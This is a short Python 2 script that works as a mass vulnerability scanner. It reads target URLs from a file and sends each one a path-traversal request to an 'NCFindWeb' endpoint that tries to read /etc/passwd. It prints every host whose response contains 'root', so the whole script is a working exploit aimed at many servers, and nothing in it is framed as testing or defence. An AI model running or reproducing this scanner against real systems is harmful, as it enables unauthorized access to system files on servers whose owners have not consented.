import requests

def check(url):
    try:
        rep=requests.get(url,allow_redirects=False,timeout=3)
        if rep.status_code==200 and "root" in rep.text:
            print url
    except Exception,e:
        pass
test=0
with open('hello_world.txt','r') as f:
    for i in f.readlines():
        test+=1
        print test
        url=i.strip('\n')
        test_url_1=url+'/NCFindWeb?service=IPreAlertConfigService&filename=../../../../../etc/passwd'
        check(test_url_1)
        
